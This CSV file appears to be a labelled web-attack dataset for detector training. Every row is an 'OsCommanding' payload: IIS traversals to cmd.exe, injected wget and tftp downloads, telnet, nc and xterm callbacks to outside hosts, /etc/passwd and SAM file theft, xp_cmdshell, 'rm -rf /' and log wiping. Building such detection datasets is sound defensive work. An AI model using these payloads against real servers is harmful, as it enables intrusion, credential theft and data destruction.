id,class,vector
17204,OsCommanding,"/scripts/file.bat"""
17272,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
17291,OsCommanding,eG3thnteev=ntar-l9+eveterE&iae4ssoee=UzmLs iframe;(i&vyoeccsgdrapxe=swindow.open8N4S<tinodex&2ez7xn0q4=8310793&ySAEHte2hkmhl=jdodtmEeIerep&eeebrh7e=8706900&o2r04ee=173&dsscEeifcph=o5deehsfanndDsIe&L9vB4=pSN&Hsgrt=wA8ZdRkpLMKn&seF5c9vnaiu=5868013
17326,OsCommanding,/am-8A/weebnedmaq4oe08/nY3XLN4nC2J7/Dzuhwrenucm/nbVpmIH5E/fee/AesLp9dsoaeiHe.js?Rall%uw-=ls+++++-las++++%2Fhome%2F+%7C
17337,OsCommanding,/scripts/..�
17347,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
17350,OsCommanding,/vJopFhdgd/sT60YEnN/iocuisaiflnRint9e.sh?PYincludephVF4=6996567309&orolrHadytTsf=%5Cn+wget+++++http%3A%2F%2F49.25.185.130%3A457%2Fnftp.exe&ahcskeluL4=sm.gce3%40t9&ahroeaycns=r404Fh&nng7engeyb2=6urieicds&tngrexYcd8RR6ao=amailmapenteota47n&inewnpelsfemfte=eqQu&ye2seihae2mE=3663&GUPZ1damZT=eniEyhowie
17381,OsCommanding,"etiEb=tEeop&bf=t4xieusrZcqins&ig=L&Cbeezmta0ioAhi=femnc&dubpona1n0T4e=230451&anaeooeehRhh=712&wget8WWbn_4v=133&i7tgto1riE=t3aMojDxn&5eiR=exec  xp_regwrite    'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\Client\ConnectTo','tlehltb','REG_SZ','DBMSSOCN,hackersip,80'&gR@7w1=rUrsehnc&Si=4&lLac=iP2GBlfW"
17388,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
17391,OsCommanding,q7iumlrWl=l_s1h3M&spenhtostguooe=h oTriha Csa&ndTaolyo3=929336&mmk=264&pg03digye=:e9+6ajhescp5emhg&t3=dDqoAZ-nhC&oedk8lszohN6mc=53270&hoohexnin= xtye8at/Mie&ym.admin=0430
17402,OsCommanding,/omsa4/9iAT9DMH/iQ6ppFe@/_we7MSV/e51kQ452/imn8tt/n1ljLgE9D2hRj@nwD/iun.js?XimAXSs=5E15&npnmel2groa=357833&tatr=%22+++++%3B+++++telnet+++88.84.217.21+++++80++++%3B
17422,OsCommanding,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
17428,OsCommanding,"1r=""     ;    /usr/bin/wget     www.elnt.com/al   ;&jdaje7ovnzye=u'+oh&rsyeRreit=900414453&hirDeNtrev=8&ehgsesedoIloeh=tnxsle&nf4te=rjecbedhtodesv2hie&en1zot=Hetsvoshg&nIscesebn=afui&weau=17884069&uAy3ptnvk8=y1locationoe8smo"
17486,OsCommanding,bipsknan3Oeln=0&B113qGgVgnode=mee&sanboi=938&Jmpp=4796706&twmiauquiS5l='k[
17487,OsCommanding,..%%35c../winnt/system32/cmd.exe?
17493,OsCommanding,/eGuXKtQOQ1MD/50XVVtmpDBFje/ctJEt2yNL_G@NkO.shtml?lXo9XcfjJQlso=eod6oet&o_5O_VallkSGselect=oiwm&sga7=nat%29senpi%3Bmth&relego=ld8mgroup+bybe0oenetcat+ps&twhereNmocha2window.openfc4Cy=xs&sri8sedReanod=%22++++%3B+++telnet+++++28.59.239.152+++80+++++%3B&eaedteitbd=l&oSegWCr=9500
17560,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
17606,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
17620,OsCommanding,/QCcmdh4_zxWsbRyy/uhf9UW/7TUM_kPm6pdk1ae4R/xVq@GAIU.mdb?fiv7ivrarsontys=%5C%22++++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.atiltosi.com+++54+++%3B&oE4@wdivH46ZH=e4gEhr%3E3%7Ce+&4toieete4=i&iheoa=mt2temeark&VkBNb2VGZ=bfolYnyhtet4snneIk&aIe4llnr=36&himjaiit=44519932&kaiC=ls9eajaqin&RWQ58qx=rngnae&W_tNzSVOf=754&zluand=5&fl78ongt=2%3C
17656,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
17689,OsCommanding,/TGfbpdUasam5z/s4VWES/lMhLr4@JWMOz/V02EJlacLIafFw/tiin.gif?
17721,OsCommanding,/q4ozeruon/tfjsnb8idzehat/o7mcNtT/odhweeCiwt7ch4Ep/wote6lrsgEif/tOu7I9xpjZ5na4CiZ/thlaeaoxE2oe/3RM8q_m/oMx6y9DJb3Pv.png?aaenllronptwT=cRerdailrotlmES&a8=08920213&yautcUrt5da=s&rrs4eZRsl9nrsam=Erunion&C6vySo=wp-t+n%2Fda
17737,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
17750,OsCommanding,/Trleyyifhetett/pgPGZ2/vsamfveRJvwhere3/sNvLmOzK6pJ3El/dT5ZvaUwL_v_0/2jr8raaa2oathaeainnn/TconnecteV6m/sh7xephqop/xeasaeu1lisdeTf/ieu0van7rf/0tseoh.png?mmh8diatct6ig=kps2d8Inedie&pslh3od=%22+%3B+++++%2Fusr%2Fbin%2Fwget+++www.rotianinla.com%2Fenasil+%3B&mdotRe=gapdoofpl8jteoaee&RsiribDa8sahNhh=hteet&ce=8MDr&isogelitt=+ymti&biniittxGeytme=4690&h0cee4csug=%28%5CemzNiframejaYtme%29etmis&prbp=ic
17756,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
17757,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
17764,OsCommanding,/4ven7m/t1d/oat/sCYBrrWV/ghaZJN@L_Lml2-/sCp9nf/Onysh/1c@9SdxHf7.Xc/njk0e8BVBk_8.js?UQcFgxmlCPI9eb=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fbin%2Fcat+++%2Fetc%2Fpasswd%7C&gEpbrt=%29shtpass
17785,OsCommanding,/atisn/abbgamgibam6n/dtxtinn/saboyem/oi/dgVjnSC15NPgXuzq/eAN-aa4hFk4/6scripta/7SiWaz2Dih_6RBYtCKO.exe?zeedisvNtds=AErt6edZsf&hoadHopa6eC6=fromi%3A&3r=iE%26%26shoYderien&3mwi=exec+xp_cmdshell++++%27%22ngeu%22+++%3E%3E+script.vbs%27&sc2ogoogvdi=cH9D&WID1JM2k@GS=weTh9iwstuEkre
17794,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
17826,OsCommanding,/4fte/eiiisfiees5O7rlune/badp_XV11k4/qandTUneval/Imepuanw.asmx?XpG7R1W=replace&s@group
17827,OsCommanding,/scripts/..�
17840,OsCommanding,da1ne=30033546&zacBKP=57239902&Klog6madminAG=\fhhboot.iniyena&olugNrdaoiisept=elt3gaktat&en=78&8wdsehlNthith=@Oe
17843,OsCommanding,/lsjmenr/eK-nr6tA0jdPyPQv/barhedttrhhu2fnow7we/omYnnHxOG8f@lQBzPR_/KEuIUbin0Q/ebZaOud_Dp/rTOi2PxAS_b/hsloiaesStbjlaai4o/citthmldsdp.asmx?blttlte9ok=mail+++++ibitdat%40tiI.fydt.gov++++%3C%3C+++%2Ftmp%2Fwu.c++++%3B&inraase=s%3Baaa%3Beaastofd
17853,OsCommanding,rtehikdnna=z&D6k1wsteqoP=9517&oAstauw=]zrt\&hirwTerpe=5txp_em&6Iear=abUf.4CN3jv&9d4r1ya7=jopg\3&rieWenw=tFV-vh@_70rl&sbgyowindow.openkdc.=3sft
17864,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
17923,OsCommanding,/f8v/xp4e1Jwhere1rcpEinsertk/tsAblPWuge7VT7pi/tsbUnegwrLGdyaitqt.nsf?aa=%22+++++%3B++telnet++++165.67.206.197+80%3B&Elmsaw3aiu=47300&fetoit7bn6=w1g0Ra9
17946,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
17977,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
18033,OsCommanding,"/scripts/file.bat"""
18045,OsCommanding,"i32P3=Maeaj&muyqosfb=erGXeS-&pndcimg2=tO_QqLfNRLqG&0hgatw7M2=5998&hm=t&xkt3agrD=i@SQRPwd9&bke= dye+httpsn&rU.6lbA.l=wFY_XUaK&ld=boot.iniotyunionncH9i0or&ncer=\""  \;    \/usr\/bin\/telnet   www.stmellalll.com  04\;"
18057,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
18075,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
18089,OsCommanding,/grh5yioNfdias.aspx?ylIotesEeLiew=%3Cselectmailo&4emfahmCacsM0se=dursRo+d%3Cek%29yy0t3e&mt=OubtaE%25piR%3Abn&zrZG4E8=6922&JPkQ=%3Bomt4&b4ztnaMco8ae=vNusof&lfl9hnsiubrmeoe=085471&otrdiwnu=%5Dtoed&5oosxyic=2&ht=dCtbfNS&nleasHeronon=%27%3B+++EXEC++++master..sp_makewebtask++++%22%5C%5C129.208.243.168%5Cwyenevbo%5Cenol.gif%22%2C+++++%22SELECT+++*++FROM+INFORMATION_SCHEMA.TABLES%22
18111,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
18135,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
18152,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
18173,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
18179,OsCommanding,/scripts/..�
18190,OsCommanding,/ttgftfenRs7/lrWWWKIj4@qBck/aaoue/tetomuque7s0atwi/x8gg7ODy_/eae3audf/wscg6gIw/SmDu-m.g745exec/tIy.nsf?orrETgu7dmsalt=nFLvsblQSo&nhabotji=bangas2p&iio=l&r7rourio=484418152&tHisd3n=toa-GeL9JfQ&rcaqcohaenis1th=72247072&azmaobwteitHsec=0561
18204,OsCommanding,..%%35c../winnt/system32/cmd.exe?
18244,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
18255,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
18257,OsCommanding,/home03/nRr9mDModLVU5BjHi7/1k/fihecircoonmbnaue/ystdino5oF3zAQacceptt/aJcrvbUiaYtR/p7gykBh6g51reUOpH/ftCn/eHRMbX@a42iaAluZ5/3ltaoeeFAnxDf7l.nsf?
18270,OsCommanding,/r45eott/tlcinbqfqn52vq9/3YXP-/rpd2aoe9r44a/qwindow.openDoCI/NI9SIgRechowF/h03Hk5009OFKbC/7tsceivdkZwtinh/nt0eesequaoedya0st/asq3ao8rsafiou.mspx?lODsmIR=%27+%3B++++tftp++++-c++++get+++www.maolie.com%3A%2Froroseic.tar&OPEztPposition.j=q0Be&rmyhpe8OioniA=4_7X-cgPoBw&ea1uueer=f2bh%26epstdinpa&ARCjWXFa=s3%40-zUAtZ
18302,OsCommanding,/yhe/ndGd8.pPi8.55J07t/xvTinputs-bdqlQ/rxIkaa8Tq@Crx/1Z7qbVYX-sorAR./N3y6.mi4/veurlesdniftslt/us.js?ruDerduuehqst=%5C%22++++%5C%3B+++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+++++www.nstera.com++++88729%5C%3B&aEEmx=dbm4&xuiOJ-J@1Q4C=ig3hheQthtda6d&k7oGuincludeu2Mm2r=o%27e%5Binput&mapha6xtt3c=r08asEgdoallO1&lm3hBoNh=log%26r9
18304,OsCommanding,/4Foi0s24ru3/L@NCX3-ZCkfAJ5/ryurEbeue/wDilnQXedXN-iI5ugq/dvhtUOoo/apasCdlirleihn/fGTSux.exe?8onm=371405&ropKg0ytgNzdr7=tirfelmptew&45ueoA5rievh=teoyngIlt9&cxDhli89enliq=677&gtnyvePeilim=nrs2ogselectA%26dgSxe&attuepOrto=anjooy6w&E1Pn-SHe%u9access_log=o%24n&bboot.ini2J6ITK.qJk=43.131.64.31++++%7Ctftp+++++-i+++4.148.41.243+++++PUT+sam._&6chcnmedei=7862162229
18316,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
18318,OsCommanding,/eam/iIE6k5gC8r/ieezim9lwE/teTweRnetSna/tHeicahc0aWEd0crnou.nsf?CE.WxOautoexecmz=4utouwT7bf&tneeemsiag=hpewnRtsi&iTbmMnde=4078&o81unbtksaaao=e&nrdwapa158aLl=6toc%3AoG&diagal=kxp&Itmp_5=T+t9&we6Gelhodhyh=958&ht=vGdwdhU&Ewhlfofhq0awbs=winnt7fi1o
18328,OsCommanding,1tEjE=7SR&rrvh=ms8rrae9&ifh3=HN4gyoud&ii1ahusu=o&Rtaeh=165.129.77.90    |  copy c:\winnt\repair\sam._ c:\inetpub\wwwroot\sam.ddd&2fGwNEa-A=mtEG64MrZeqG
18338,OsCommanding,/eneeT/efA5ORIs.Fz58wuzB4a/lgb2oDtsa7tvi2a/oi8aaItosiesehlors/3isrpfyyTelad1oenrf/aVnaR@Ewonwj6M/stncggqZpbdJ-wUeQv9T.dll?UYYK1yexec=+++%3B+++++echo++++%3Bw+++%3B++uname+++-a++++%3B+id&n4tegse=00&nei=6604829
18353,OsCommanding,/otlse6/zv4ycn/Z9Pxterm6F/a-iW79.aM6mMki.cfm?Tl=0311362&tuoshco67besna=32&roiuNaeuss=38702&m69nlgtuje=d&bms3tAN3gguL1rM=likeeperlhavingOvr+ia&eseuq6r=73320630
18371,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
18389,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
18428,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
18436,OsCommanding,/w@Mm0f./wsdeeytgoni/azEMeedmKKVUSLr9OE5/noha3wkxfy07pRUUCzdO/iYLc_q_B/tFuQMRvQnKq/sh.gif?sooesaceHax=%27%3Buftp+++-g++%2Fhome%2Ficstilntas%2Fmeilnelane++198.11.209.228+%2Fintiin++%3B
18477,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
18478,OsCommanding,/ayTqei/abtkWtNyA1ClR1/dt5cnt/Ersy/Enpes1xida/Wscriptq-_gm/M1Z1cXyQEqXosystem/6ZmMF/ElInrmwtmhd.bin?tskTqesoe=%40eTeinputc&i39_kk@LZ=oeth4hrexect3n%3B&tte=mQXcxvtnG&NkJFaJH=daVtuba9ii5&mrnnom=%27++%3B+cat++%2Ftmp%2Fres+mail+++++trintrtr%40el.com+++%3B&rul2r=h&betweenjSZ=8465019849&rurdIx2brtt=sfirmn&ednmexdi4swda=2ba%3F&C2QPHe4YnBsock_streamu=dseeY3
18486,OsCommanding,/s__/eMYo6FkKRRLUo7/fchqoEeohr/RmzKif4lfvmetaZ/MYFanza_htpass2Elt/@3@WAM/nHqqO.cfm?_v8-oRZbin0=%27+++%3B++++rm++++%7E%2F.bash_history+++++%3B&nektrroebdo=408598009
18530,OsCommanding,_G5exec=35169940&vqT=8379859&ecettb9jmteban=` rm  -rf     /     `&ivgzsdu7hln5=dajsgrlla?I&rm=lsssamh&K4techoF=noU%:&mcmldlr=i on6sthjybmi(d&enoe=lNo/&H11=aEn?&vhconnectZz3a9=euH&tinlr=5&weic=294841&espamamWei2=oii1ekaNtT
18589,OsCommanding,/4Ftelnetmeval44ZL/Iobt/aLSNx5LZ8.ViG@03YW/aq/l1tnxkooa3emSl8moh/icHpcxTiJFKSmESv/WoLe4nR/Rmtct4i.gif?ame4hnuaterceav=eaEbwa4ykaeng&iegTeoMeriner=0720170&sfenbrtT=tueaqtfoiOesfsh&rnbacltiesvO=1eobheMr&tzd3d6m=sbe&aaEtco=iGhnfbtanad&tgloeotiiea=xp_oi&eJPioa=612&ikuhtse=%7C+++%2Fbin%2Fcat++%2Fetc%2Fpasswd%2500.html&huu8KRsh6oljve2=%3Eametahm
18592,OsCommanding,/cgi-local/alibaba.pl|dir
18624,OsCommanding,/pdYFeaBLT4rWN/item6.css?23fHexecPSQI=hrtnphael6aco&5ndhe=iku&bai=8525&si=%22++%3Btelnet++119.189.95.128+++80+%3B
18629,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
18701,OsCommanding,/1u9tsvLp.php3?6lg3Ax=950169&nircSead=tRXcVq&etheyimj=%250a++++nc+www.neri.com++80+++++%3B&bhtnei3tHeAe=78161&pmrhhcoeahq=+%3B&Airn8muxalwLy=9&nt=ahVR3V&nei=aopv4vlllsMbcniE&cJg4rtoDrmlXG=etJ%7Ct9%2BYMeae
18714,OsCommanding,/handler;cat
18772,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
18787,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
18833,OsCommanding,..%%35c../winnt/system32/cmd.exe?
18846,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
18864,OsCommanding,vc=31451712&iar=rOu1RFORYnX&loda=|cat     ../../../../../../../etc/passwd    |&ki7=sdincludemae&obthTPUtwwdo=285141&isnlp=sMzBiRY&r9=B
18877,OsCommanding,/TY/5vduO0OxZR1yfC7xTR5/eeR4h.Fqu3UL67J2zi/PSJVAg2Z5yv/PHxZ/Pisam5T.c3Pqnrchild/2mailZoEIDmuuGHQ/ayQNnOGzgy1x/aAZF0Eo/ewI/6YXUcTD1eDKE.php?
18962,OsCommanding,/eW5NE_v/sj6uaZoKv/hSiB8eA2/tOkfkPpidaQ/swmr3e2/8trtfhFK/6Bteqfz0FKgmjZ/oWSuvR-pP.G-/l7ht5eA/teaht/ei7@m6zThOn/nkkA-.php4?2om1eetur=3&2JCADs=0cmh&aohhEoyet=eY%28ei%26dg&iqvLane9xtia0=e%28h1%26Cenesperlt%3Ana4w%26&SalC=nediv&hkyseinenudefe=n9Zt&Bat7F79Zk.cg=%250arm+++++-f+++++%2Fvar%2Flog%2Fhttpd%2Faccess_log+++++%3B&otebsRdTftg=tyu%406VN9&ap9=0B6Er&bhdua=eTujZMi&iuinl8ta2a=HR%40sphptlaye&EhyaGh=280466201
18970,OsCommanding,lTtdjSsMv2=hdrope&4hsmsnOs=5&t9tet=4155793&hut=98&1iStqri1a=ttggzxs$null lezs&doEqioy=130&etxeB7rEetnEae=091453995&H7rbBpc=fromvIeval&GsIWlDQDmC=otaioFWnnhe&lndiAuh=otjr&iaymfs=|  /usr/openwin/bin/xterm+-display+194.239.26.23:0%00&ek=lihrinH&tshOnmekwh=0218093495&oAfhhborx=ooncecs zuee37e
19050,OsCommanding,/teiZadE5GludWJGVCa0.css?hv4sLhavingoPwherehRl=awlfart6iwb8o&onmafsfe=%26nc&tstfae=euelglRdc8bWsriJ&UvXallAsVM=dscript&SFoaTmWKopt=ehuSr&sthq=15073398&XheUwJPsBkP=t1ykte8vYRiaan&k8ws=%250A++++xterm+++++-display++++www.ndlias.com%3A0.0++&pDQCHaB4xR=en1iotsireiepyrvyo&dtewofrsdet=nt%26tItngllcleevalm%3CFtlocation&etsgtgxytg=50622223&ni05rdhIejg=lFHB_Bmrw&awxEqincludeK=05aIUn&baheYnsE6ce=85
19095,OsCommanding,eaosA=765&2skRrr=snrhijDNnp3oh&gr=5n&eee=o=oist-Yw&OucTz=498&7iadyneoa=AlnAonahn
19137,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
19150,OsCommanding,/e4HDiAPIbFl/rQvAj/ekGiFNZR/4H4EC@/VunionKzconnect/bt1V-Z174dQy/W1gcQRLnL.Op/2p/nT@ip3wGZJqwNWhQ/nodesL_6vstdineLA7HOg.css?ovaU=%7C+cat+++%2Fetc%2Fpasswd++%7C&5n5=nio&8nt2=fDTBm2t7&amongzetsahw=2echo%40nq%28soe%3B
19154,OsCommanding,/aU4ZGveQv/8zpG63tv6uXzN@u/hie9fop/Gyy_ucat9Vr3JPa/nf6ak7ai8rnn.js?jX2execimg41node8=%250arm++-f+%2Fvar%2Flog%2Fhttpd%2Faccess_log%3B&ash8uEwhltldI=88248468&aesaer=808212&VwaPcatrPP=sw8goqwyorrflzie&chchhvs=iokaeeiE&.havingbinO8@7-H3H=ngotwwus&hO7S=eDx&dmTsoyc=046&EShntsudd=odrnr&s9cpnh=8xtermajdb%7Caso&aldoiiZhorj2=w%7CTfLtbs6dan&eb=82392
19165,OsCommanding,/eABG/we/loSala2anbuta/ampiPvhKfT/F8F.js?ig1o=234.116.194.206++%3B++tftp+192.168.10.33+test.txt
19179,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
19247,OsCommanding,"/scripts/file.bat"""
19272,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
19276,OsCommanding,/bAVhEe5YFv/hRQeAoAV9P8zs7xj/hEFXV3X/8bODM5Wt/aT5eoHeai7uRcuweeepE/cNB8gAu7bLDOAoyW-6FB/rweNqp/eHtcAlesyiSgote2rer/tgo@qEE9hXiRWNXMl/eaF3Xj/hseoIicote9ew/nn1tdtscjeeny.gif?trtr=46.35.242.32+++%7C++++echo+%22test%22+%3Eevilfile.txt
19348,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
19367,OsCommanding,..%%35c../winnt/system32/cmd.exe?
19371,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
19375,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
19414,OsCommanding,/09gU/aE-6eUbjw@/V8r52mlibNiframevIE_/7sUtuncthi/7l/rO5V/HshutdownV1xEyqWjV9/fi/9qTef.xsF.bin?mp=+ckgsetps&AcyuHrnB=o4t4meeh9el&szntd=maae&allt8tet=zN2aI8jJ&hdjfsjby9=oE&IgD6=ghiKkIi&nvmizfm=871179325&wherexOFMKjzFNo=i2dRX79&uGsiw=acpuqniebntfthwM1&insertf5Xa0nwp-=lMAef3ogeetSzt&ep=%27%3B+++++rm+%7E%2F.bash_history+%3B&iasIdsg=4
19492,OsCommanding,"/scripts/file.bat"""
19503,OsCommanding,/teeo/4o6LDP/t8PKr8Ec/Esmiq0c/t3/ytnVOfe4lndrelD/hi53g/34gvps1MujD5.gif?PbVHBJ=irheaMEuonnh&rpo9e=copytr1phqtll&tttC8m=hq4m8&ulrohinoy=w%2F%3Dt0nullEtts3nt9&nilo=8317118&lnezte0tetn=137&aue6hireE=%3Eeij&aiyn5ysw=sP9kHVpl3kU&net8syGueaeue=3&eo0atp0nAhs5e=27.62.109.150+%7Ccopy+c%3A%5Cwinnt%5Crepair%5Csam._+c%3A%5Cinetpub%5Cwwwroot%5Csam.ddd&rerxeanhngeups=+gshaving
19512,OsCommanding,/mjJQsHcBJ@mOXjW-t/YN/thhaiega3airsn/i4jTG5vO/aitrntiHnnejAorHa/N9Seg8RservicesA-/2teldt6hniSvkd/v2QphpiOoMyh/toogFnaco1eeetuae1/EYPM_Qve_aposition/eYktDXdBE.php3?gdeecatehdmd3c=adminh&replacepNpe=%27tt&decxiaeanq9ldw=++%3B+++++echo+++++++%3B++++w++++++++++%3B++uname+-a++%3B++id&atqtfc1lH5=ftPHRerntme&lnnEtod5aofv=divrigsvrGdusrbgsoundgroup+byinsertoxml%3Ao&5inzeb=e4Pe7weSoh&mhmotsaeeIimnmh=3070&eScd5gh=1CcjD&oagexw=havingxexecrxp_hioS6ytM&Emealtow=84133149&djriyeap=nvnmer1e&sydji3wniro=iekS6&lx0ts=ftuye
19516,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
19553,OsCommanding,/ssi/envout.bat?|dir%20..............1
19560,OsCommanding,/ebRaqttreeght/tf5lat/iKaRfAsxCltX/srd3qiyi7cilt/riNZGjt/iWanstteaSg4ieWemrae/eyaEtehudtptdstC/d6LE4wCPVN9eZsCzdhhZ/4K1X3YU3GHFwOvYvs@I.png?ddWnanafimsf5dc=88&qcek9e=98&ng=+etcs&ypaeeoooeoser=%3D%29Yfca+&tnye=764479&Z.IF.@IQ=++wuvslinkSc%24hinsertposition%5Bs%40ewBn&lADttmzstesyd=eteaaaLIaccess_logathFgaixterm%2Fa&eitetoltr=%250a+nc+++www.anantens.com++++80+++++%3B
19607,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
19611,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
19648,OsCommanding,/file.bat/..��..��..��winnt/system32/cmd.exe/c
19677,OsCommanding,/iBN26Zdy1SSl/v7O4betweenDU4/ri/lXijckGQf1SX/tv/aaeSkitaut/8zI8QbGC9UG/TcdRpfRreEs/s6WjwjN9Ny_zC/tre0XEt_1zouhJPT.j/3seitftdruoInInGcp.css?eeuyab08mqbe=rm+-f+++%2Ftmp%2FeR++%7C&AKreplaceGTlSbQ=umqHOJ&wmphttlisrewOcr=6bcd&rdgNhdtefszl=3097518&wbauUgn5g5rc4pp=rtig&iO=bo5r-d&Sastppm=access_logrrHn%3Fnnvtziaa+puwget&oetdhJo=o%7Cs6mrur2f&dtt=S
19678,OsCommanding,..�
19683,OsCommanding,/es3paghrtBa/oaihCr8omeyjsteevE/FV.shtml?2oors1haAewg=ehsMhtbisHgsp&SBaaX=8nE9%40rpE7gmr&kdiseeC8boqsah=tvhlveypechoiframe%28e&nccmseOletR=%22+%3B+%2Fusr%2Fbin%2Fwget++++www.ndetesna.com%2Fle++++%3B&1DhdYXlsE=Toii
19727,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
19786,OsCommanding,/bin/alibaba.pl|dir
19799,OsCommanding,/ten2Ehmf7noyCB7gCd/nSAyXuFnRNzciI/popftctkst/oEtaeesttyCnd/einlscRtbf/EAaywiynyhi/a3TcDt_ycx8Ch1WtsiE/ect5feseeN0sgh.css?rtestusthquBss=+es&1f27=%7Ccat+++..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd++++%7C
19823,OsCommanding,/scripts/..�
19858,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
19859,OsCommanding,"btmo4E=39873&Meeez=\""    \;   \/usr\/bin\/telnet   www.lieticri.com   84\;&bavbhr6i=15348&oosRsxe=ftUa2Df9t&afewTn14e8=odteosAsamxanienirHhttpsi &swetcEhx6lk=yaz'&t74ajMhieAEdeo=re&scriptprocessing-instructionOeselectmiS=raq5j73&SZXIHG=5587&DuUOeVZYpzN=1XXz1I&vttk90iepRc0=awaK&EeeeyhhDaZl=opene9w allx0y"
